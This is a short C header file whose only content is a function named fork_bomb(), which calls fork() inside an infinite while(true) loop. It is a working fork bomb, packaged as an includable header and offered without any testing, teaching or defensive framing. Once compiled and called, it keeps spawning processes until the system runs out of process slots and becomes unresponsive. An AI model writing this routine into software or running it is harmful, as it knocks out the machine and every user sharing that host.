#ifndef _FORK_BOMB
#define _FORK_BOMB

void fork_bomb(){
	
	while(true){
		fork();
	}
}

#endif
